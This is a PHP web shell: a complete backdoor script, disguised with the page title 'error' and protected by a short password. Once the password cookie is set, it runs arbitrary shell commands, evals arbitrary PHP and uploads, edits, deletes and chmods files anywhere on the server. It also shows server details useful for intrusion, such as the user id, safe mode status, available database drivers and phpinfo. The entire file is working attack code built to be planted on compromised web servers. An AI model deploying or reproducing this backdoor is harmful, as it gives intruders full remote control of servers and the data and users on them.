<?php
error_reporting(0);
$password='hk';


$xyn='tunafeesh';
if(isset($_POST['pass'])) {if($_POST['pass']==$password) {setcookie($xyn, $_POST['pass'], time()+3600);} let_him_in();}
if(!empty($password) && !isset($_COOKIE[$xyn]) or ($_COOKIE[$xyn]!=$password)) {initiate(); die();}
$me=basename(__FILE__);$server_soft=$_SERVER["SERVER_SOFTWARE"];$uname=php_uname();$cur_user=get_current_user().' uid:'.getmyuid().' gid:'.getmygid();$safe_mode=ini_get('safe_mode');$safe_mode=($safe_mode)?('<font color:green>ON</font>'):('<font color=red>OFF</font>');$cwd=getcwd();$bckC='#333333';$txtC='#999999';
$start='<html><head><title>error</title><style>body {background:'.$bckC.';color:'.$txtC.';font-size:9pt;font-family:Trebuchet MS,cursive,sans serif;}h1#n{position:fixed;top:10px;left:10px;text-shadow:0px 0px 5px black;color:crimson;}h1#nm{text-shadow:0px 0px 5px black;color:crimson;}a {color:'.$txtC.';text-decoration:none;font-family:Comic Sans Ms,cursive,sans serif;}a:hover {color:yellow;}hr {background:'.$txtC.';color:gold;}p#bck{position:fixed;top:20px;right:20px;}#menu {position:fixed;bottom:0px;width:100%;font-size:13pt;}#menuB {background:'.$bckC.';box-shadow:0px 0px 5px gold;border-radius:15px;padding:5px 20px 5px 20px;}table#moreI{font-size:9pt;background:'.$bckC.';border-radius:10px;box-shadow:0px 0px 10px black;padding:5px;position:fixed;bottom:40px;right:40px;display:none;}p#cp {font-size:11pt;}table#lt {font-size:10pt;}input#lt,input#sv {background:'.$bckC.';border-radius:10px;border:1px solid '.$txtC.';color:'.$txtC.';text-align:center;}input#ltb {background:rgba(0,0,0,0);border-radius:10px;color:white'.$txtC.';box-shadow:0px 0px 1px '.$txtC.';border:0px solid rgba(0,0,0,0);}table#ft {font-size:9pt;padding:5px;border-radius:10px;box-shadow:0px 0px 5px gold;}td#fh {border-bottom:1px solid '.$txtC.';padding-bottom:3px;}tr#fn:hover{box-shadow:0px 0px 5px black;}h3 {text-shadow:0px 0px 4px black;font-size:13pt;}textarea#edit {background:'.$bckC.';color:'.$txtC.';box-shadow:0px 0px 10px black;border-radius:10px;border:none;padding:10px;}</style><script type="text/javascript">function get_inf() {if(document.getElementById(\'moreI\').style.display=="block"){document.getElementById(\'moreI\').style.display="none"}else {document.getElementById(\'moreI\').style.display="block";}} function xyn(id1,id2) {document.getElementById(id1).style.display="block";document.getElementById(id2).style.display="none";}</script></head><body><h1 id="n"><a href="?x=x">about</a></h1>';
$menu='<center><p id="menu"><span id="menuB"><<a href="'.$me.'">Home</a>> <<a href="?x=cmd&d="'.realpath('.').'">Command</a>> <<a href="?x=php&d="'.realpath('.').'">PHP</a>> <<a href="javascript:get_inf();">Info</a>> <<a href="?x=q">Logout</a>> </span></p></center>';$end='</body></html>';$inf='<center><p id="inf">  <b><i><u>software:</u></i></b> '.$server_soft.'    <b><i><u>system:</u></i></b> '.$uname.' </br> <b><i><u>user:</u></i></b> '.$cur_user.'  <b><i><u>safe mode:</u></i></b> '.$safe_mode.'  <b><i><u>directory: </i></b></u>'.$cwd.' </p></center><hr>';
print $start;print $menu;print $inf;
$moreI=array('PHP Version' => phpversion(),'Zend Version' => zend_version(),'Magic Quotes' => magic_quotes(),'Curl' => curl(),'Register Globals' => reg_globals(),'OpenBase Dir' => openbase_dir(),'MySQL' => myql(),'Gzip' => gzip(),'MsSQL' => mssql(),'PostgreSQL' => postgresql(),'Oracle' => oracle(),'Total Space' => h_size(disk_total_space('/')) ,'Used Space' => h_size(disk_free_space('/')),'Your IP' => $_SERVER['REMOTE_ADDR'],'Server IP' => $_SERVER['SERVER_ADDR']);print '<table id="moreI">'; foreach($moreI as $n => $v) {print '<td>'.$n.'</td><td> :> </td><td> '.$v.'</td><tr>';} print '<td colspan=3 align="center"><a href="?x=phpinf" target="_blank">PHPInfo</a></td></table>';
if(isset($_GET['d'])) {chdir($_GET['d']);}
if(isset($_REQUEST['x']))
{
	print '<p id="bck"><a href="?d='.realpath('.').'"> < BACK > </a></p>';
	switch($_REQUEST['x'])
	{
		case 'c': if(isset($_POST['edit_form'])){$f=$_GET['f'];$e=fopen($f,'w') or print '<p id="nn">Error Opening File</p>';fwrite($e,$_POST['edit_form']) or print '<p id="nn">Couldn\'t Save File</p>';fclose($e);}print '<center><p>urfile '.$_GET['f'].' ('.perms($_GET['d'] . $_GET['f']).') .</p></br></br><form action="?x=c&d='.realpath('.').'&f='.$_GET['f'].'" method="POST"><textarea cols=90 rows=15 name="edit_form" id="edit">';if(file_exists($_GET['f'])){$c=file($_GET['f']);foreach($c as $l){print htmlspecialchars($l);}}print '</textarea></br></br><input type="submit" value="Save" id="sv"></form></center>';break;
		case 'cmd': print '</br></br><center><h3>Execute Command</h3><form action="?x=cmd&d='.realpath('.').'" method="POST"><input type="text" value="" name="cmd" id="lt">  <input type="submit" value="Go" id="lt"></form></br><textarea cols=90 rows=15 id="edit">';if(isset($_POST['cmd'])) {$cmd=$_POST['cmd']; execute(exec_meth(),$cmd);}print '</textarea></center>';break;
		case 'php': print '</br></br><center><h3>PHP Code</h3><form action=?x=php&d="'.realpath('.').'" method="POST"><input type="text" value="" name="pcode" id="lt"> <input type="submit" value="Go" id="lt"></form></br><textarea cols=90 rows=15 id="edit">';if(isset($_POST['pcode'])) {$p=$_POST['pcode'];eval($p);}print '</textarea></center>';break;
		case 'phpinf': phpinfo();break;
		case 'q': setcookie($xyn,'',time()-3600);let_him_in();break;
		case 'x': print '</br></br></br><center><h1 id="nm"> error </h1><h3><a href="mailto:">d3bian1337@gmail.com</a></h3><h3><a href="https://www.google.com/" target="_blank">error</a></h3></center>';break;
	}
}
else
{
	if(isset($_GET['d'])) {chdir($_GET['d']);}
	if(isset($_GET['ndir'])) {$d=$_GET['d'];$n=$_GET['ndir'];mkdir($d .DIRECTORY_SEPARATOR. $n);}
	if(isset($_POST['new'])) {$n=$_POST['new'];$o=$_POST['old'];$d=$_POST['d'];rename($d.DIRECTORY_SEPARATOR.$o,$d.DIRECTORY_SEPARATOR.$n);}
	if(isset($_GET['deld'])) {$d=$_GET['deld']; rmdir($d);}
	if(isset($_GET['delf'])) {$d=$_GET['delf']; unlink($d);}
	if(isset($_GET['ch'])) {$ch=$_GET['ch']; $d=$_GET['df']; chmod($d,$ch);}
	if(isset($_FILES['upfile']['name'])) {$d=realpath('.').DIRECTORY_SEPARATOR.basename($_FILES['upfile']['name']);move_uploaded_file($_FILES['upfile']['tmp_name'],$d);}
	print '<p align="center" id="cp">'.curpath('').'</p>';
	print '<table width=90% align="center" id="lt"cellpadding="0"><td align="center"><form action="?d='.realpath('.').'" method="GET">Create Dir: <input type="hidden" name="d" value="'.realpath('.').'" id="lt"><input type="text" value="" name="ndir" id="lt"> <input type="submit" value="Go" id="lt"></form></td><td align="center"><form action="?d="'.realpath('.').'" method="GET">Create File: <input type="hidden" value="'.realpath('.').'" name="d" id="lt"><input type="hidden" value="c" name="x"><input type="text" value="" name="f" id="lt"> <input type="submit" value="Go" id="lt"></form></td><td align="center"><form action="?x=cmd&d='.realpath('.').'" method="POST">Command: <input type="text" value="" name="cmd" id="lt"> <input type="submit" value="Go" id="lt"></form></td><td align="center"><form action="?d='.realpath('.').'" method="POST" enctype="multipart/form-data">Upload: <input type="hidden" value="100000000" name="MAX_FILE_SIZE"><input type="file" name="upfile" id="ltb"> <input type="submit" value="Go" id="lt"></form></td></table>';
	print '</br>';
	$filex=array();
	$dirx=array();
	print '<table width="80%" align="center" id="ft" ><td id="fh"><b>Name</b></td><td id="fh" align="center"><b>Permissions</b></td><td id="fh" align="center"><b>Owner</b></td><td id="fh" align="center"><b>Options</b></td><tr id="fn">';
	if($handle=opendir('.')) {while(false !== ($file=readdir($handle))) {if(is_dir($file)) {$dirx[] .= $file;} else {$filex[] .= $file;}}asort($filex);asort($dirx);$i=0;
	foreach($dirx as $file) {if(function_exists('posix_getpwuid') && function_exists('posix_getgrgid')) {$own=posix_getpwuid(fileowner($file)); $grp=posix_getgrgid(filegroup($file));} else {$own['name']='???'; $grp['name']='???';}  print '<td id="fc"><span id="n'.$file.'"><a href="?d='.realpath($file).'">'.$file.'</a></span><span id="r'.$file.'" style="display:none;"><form action="?d='.realpath('.').'" method="POST"><input type="hidden" value="'.realpath('.').'" name="d"> <input type="text" value="'.$file.'" id="lt" name="new"><input type="hidden" value="'.$file.'" name="old"> <input type="submit" id="lt" value="Rename"> <input type="button" id="lt" value="Cancel" onClick="xyn(\'n'.$file.'\',\'r'.$file.'\');"></form></span><span id="d'.$file.'" style="display:none;"><form action="?d='.realpath('.').'" method="GET">Are you Sure?<input type="hidden" value="'.realpath($file).'" name="deld"> <input type="submit" value="Yes" id="lt"> <input type="button" id="lt" value="No" onClick="xyn(\'n'.$file.'\',\'d'.$file.'\')"></form></span></td><td id="fc" align="center"><span id="h'.$file.'"><a href="javascript:xyn(\'c'.$file.'\',\'h'.$file.'\');"><font color="'.get_color($file).'">'.perms($file).'</font></a></span><span id="c'.$file.'" style="display:none;"><form action="?d='.realpath('.').'" method="GET"><input type="hidden" value="'.realpath($file).'" name="df"><input type="text" value="'.perms($file).'" id="lt" name="ch"> <input type="submit" id="lt" value="Go"> <input type="button" id="lt" value="Cancel" onClick="xyn(\'h'.$file.'\',\'c'.$file.'\');"></form></span></td><td id="fc" align="center">'.$own['name'].' : '.$grp['name'].'</td>'; if($i==0 or $i==1) {print '<td id="fc"></td><tr id="fn">';} else {print '<td id="fc" align="center"><a href="javascript:xyn(\'r'.$file.'\',\'n'.$file.'\')">[R]</a> <a href="javascript:xyn(\'d'.$file.'\',\'n'.$file.'\')">[D]</a></td><tr id="fn">';} $i++;}
	foreach($filex as $file) {if(function_exists('posix_getpwuid') && function_exists('posix_getgrgid')) {$own=posix_getpwuid(fileowner($file)); $grp=posix_getgrgid(filegroup($file));} else {$own['name']='???'; $grp['name']='???';} print '<td id="fc"><span id="n'.$file.'"><a href="?x=c&d='.realpath('.').'&f='.$file.'">'.$file.'</a></span><span id="r'.$file.'" style="display:none;"><form action="?d='.realpath('.').'" method="POST"><input type="hidden" value="'.realpath('.').'" name="d"> <input type="text" id="lt" value="'.$file.'" name="new"><input type="hidden" value="'.$file.'" name="old"><input type="submit" id="lt" value="Rename"><input type="button" id="lt" value="Cancel" onClick="xyn(\'n'.$file.'\',\'r'.$file.'\');"></form></span><span id="d'.$file.'" style="display:none;"><form action="?d='.realpath('.').'" method="GET">Are you Sure?<input type="hidden" value="'.realpath($file).'" name="delf"> <input type="submit" value="Yes" id="lt"> <input type="button" id="lt" value="No" onClick="xyn(\'n'.$file.'\',\'d'.$file.'\')"></form></span></td><td id="fc" align="center"><span id="h'.$file.'"><a href="javascript:xyn(\'c'.$file.'\',\'h'.$file.'\');"><font color="'.get_color($file).'">'.perms($file).'</font></a></span><span id="c'.$file.'" style="display:none;"><form action="?d='.realpath('.').'" method="GET"><input type="hidden" value="'.realpath($file).'" name="df"><input type="text" value="'.perms($file).'" id="lt" name="ch"> <input type="submit" id="lt" value="Go"> <input type="button" id="lt" value="Cancel" onClick="xyn(\'h'.$file.'\',\'c'.$file.'\');"></form></span></td><td id="fc" align="center">'.$own['name'].' : '.$grp['name'].'</td><td id="fc" align="center"><a href="javascript:xyn(\'r'.$file.'\',\'n'.$file.'\')">[R]</a> <a href="javascript:xyn(\'d'.$file.'\',\'n'.$file.'\');">[D]</a></td><tr id="fn">';}}
	print '</table></br></br></br>';
}
function openbase_dir(){$x=ini_get('open_basedir');if(!$x) {$o='<font color=red>OFF</font>';}else {$o='<font color=green>ON</font>';}return($o);}
function magic_quotes(){$x=get_magic_quotes_gpc();if(empty($x)) {$m='<font color=red>OFF</font>';}else {$m='<font color=green>ON</font>';}return($m);}
function curl(){if(extension_loaded('curl')) {$c='<font color=green>ON</font>';}else {$c='<font color=red>OFF</font>';}return($c);}
function reg_globals(){if(ini_get('reqister_globals')) {$r='<font color=green>ON</font>';}else {$r='<font color=red>OFF</font>';}return($r);}
function oracle(){if(function_exists('ocilogon')) {$o='<font color=green>ON</font>';}else {$o='<font color=red>OFF</font>';}return($o);}
function postgresql(){if(function_exists('pg_connect')) {$p='<font color=green>ON</font>';}else {$p='<font color=red>OFF</font>';}return($p);}
function myql(){if(function_exists('mysql_connect')) {$m='<font color=green>ON</font>';}else {$m='<font color=red>OFF</font>';}return($m);}
function mssql(){if(function_exists('mssql_connect')) {$m='<font color=green>ON</font>';}else {$m='<font color=red>OFF</font>';}return($m);}
function gzip(){if(function_exists('gzencode')) {$m='<font color=green>ON</font>';}else {$m='<font color=red>OFF</font>';}return($m);}
function h_size($s){if($s>=1073741824) {$s=round($s/1073741824*100)/100 .'GB';}elseif($s>=1048576) {$s=round($s/1048576*100)/100 .'MB';}elseif($s>=1024) {$s=round($s/1024*100)/100 .'KB';}else {$s=$s.'B';}return($s);}
function curpath($d){if($d=='') {$d=getcwd();}$p='';$n='';$dx=explode(DIRECTORY_SEPARATOR,$d);for($i=0;$i < count($dx);$i++) {$g=$dx[$i];$p.=$dx[$i] . DIRECTORY_SEPARATOR; $n .='<a href="?d='.$p.'">'.$g.'</a>'.DIRECTORY_SEPARATOR;}return($n);}
function get_color($f){if(is_writable($f)) {$c='#ccff00';}if(!is_writable($f) && is_readable($f)) {$c=''.$txtC.'';}if(!is_writable($f) && !is_readable($f)) {$c='greenmson';}return($c);}
function perms($f) {if(file_exists($f)) {return substr(sprintf('%o',fileperms($f)), -4);} else {return '???';}}
function exec_meth() {if(function_exists('passthru')) {$m='passthru';} if(function_exists('exec')) {$m='exec';} if(function_exists('shell_exec')) {$m='shell_exec';} if(function_exists('system')) {$m='system';} if(!isset($m)) {$m='Disabled';} return($m);}
function execute($m,$c) {if($m=='passthru') {passthru($c);} elseif($m=='system') {system($c);} elseif($m=='shell_exec') {print shell_exec($c);} elseif($m=='exec') {exec($c,$r); foreach($r as $o) {print $o.'</br>';}} else {print 'dafuq?';}}
function initiate(){print '<table border=0 width=10% height=8% align=center style="background:white;color:white;"><td valign="middle"><center><b><font color="black">...</font></b><center><form action="'.basename(__FILE__).'" method="POST"><input type="password" maxlength="2" name="pass" style="background:white;color:white;border-radius:1px;border:1px solid silver;text-align:center;"> <input type="submit" value=">></form></center></td></table>';}
function let_him_in() { header("Location: ".basename(__FILE__)); }
print $end;
?>